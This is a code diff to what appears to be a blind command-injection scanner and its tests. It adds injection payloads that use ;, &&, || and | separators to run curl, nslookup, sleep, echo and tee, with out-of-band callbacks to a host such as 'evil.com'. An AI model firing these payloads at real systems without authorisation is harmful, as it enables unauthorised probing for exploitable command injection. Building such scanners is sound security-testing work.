@@ -76,9 +76,19 @@ def _build_blind_cmdi_payloads(
         (f";wget http://{base}/cmdi -O /dev/null#", "linux", "wget-semicolon"),
         (f"|wget -q http://{base}/cmdi", "linux",   "wget-pipe"),
 
+        # ── Linux: && / || separators ────────────────────────────
+        (f"&&nslookup {base}",           "linux",   "nslookup-and-and"),
+        (f"&&curl http://{base}/cmdi",   "linux",   "curl-and-and"),
+        (f"||nslookup {base}",           "linux",   "nslookup-or-or"),
+        (f"||curl http://{base}/cmdi",   "linux",   "curl-or-or"),
+
         # ── Linux: ping-based (ICMP — works when DNS/HTTP blocked)
         (f";ping -c1 {base}#",          "linux",   "ping-semicolon"),
         (f"|ping -c1 {base}",           "linux",   "ping-pipe"),
+
+        # ── Linux: file write canary (confirms exec without OOB net)
+        (f";echo cmdi>{base.replace('.','_')}.txt#", "linux", "file-write-canary"),
+        (f"|tee /tmp/{token[:8]}.canary",           "linux", "tee-canary"),
 
         # ── Windows: DNS-based ───────────────────────────────────
         (f"& nslookup {base} &",         "windows", "nslookup-amp-win"),
@@ -210,6 +220,9 @@ class BlindCmdi(BaseModule):
             (f"& sleep {delay} &",          "sleep-bg-amp",         float(delay)),
             (f"'; sleep {delay} #",         "sleep-squote-break",   float(delay)),
             (f'"; sleep {delay} #',         "sleep-dquote-break",   float(delay)),
+            # Linux: && / || separator variants
+            (f"&&sleep {delay}",            "sleep-and-and",        float(delay)),
+            (f"||sleep {delay}",            "sleep-or-or",          float(delay)),
             # Windows
             (f"& timeout /T {delay} &",     "timeout-win",          float(delay)),
             (f"& ping -n {delay+1} 127.0.0.1 &", "ping-delay-win", float(delay)),
@@ -530,11 +543,42 @@ class TestBlindCmdi:
         assert any("nslookup" in l for l in labels)
         assert any("curl" in l for l in labels)
 
+    def test_and_and_or_or_separators(self) -> None:
+        payloads = _build_blind_cmdi_payloads("evil.com", "tok")
+        labels = {p[2] for p in payloads}
+        assert any("and-and" in l for l in labels), "&& separator missing"
+        assert any("or-or" in l for l in labels), "|| separator missing"
+
+    def test_file_write_canary_present(self) -> None:
+        payloads = _build_blind_cmdi_payloads("evil.com", "tok")
+        labels = {p[2] for p in payloads}
+        assert any("canary" in l for l in labels), "File write canary payloads missing"
+
+    def test_all_separator_types(self) -> None:
+        """Verify every required separator type is represented in OOB payloads."""
+        payloads = _build_blind_cmdi_payloads("evil.com", "tok")
+        payload_strings = [p[0] for p in payloads]
+        combined = " ".join(payload_strings)
+        assert ";" in combined,   "Semicolon separator missing"
+        assert "&&" in combined,  "&& separator missing"
+        assert "||" in combined,  "|| separator missing"
+        assert "|" in combined,   "Pipe separator missing"
+        assert "\n" in combined,  "Newline separator missing"
+        assert "`" in combined,   "Backtick separator missing"
+        assert "$(" in combined,  "$() subshell missing"
+        assert "& " in combined,  "Windows & separator missing"
+
     def test_time_payloads(self) -> None:
         payloads = BlindCmdi._time_based_payloads()
         assert len(payloads) >= 6
         for p, label, delay in payloads:
             assert delay > 0
+
+    def test_time_payloads_and_and_or_or(self) -> None:
+        payloads = BlindCmdi._time_based_payloads()
+        labels = {p[1] for p in payloads}
+        assert any("and-and" in l for l in labels), "&& time-based missing"
+        assert any("or-or" in l for l in labels), "|| time-based missing"
 
     def test_module_metadata(self) -> None:
         assert BlindCmdi.NAME == "blind_cmdi"
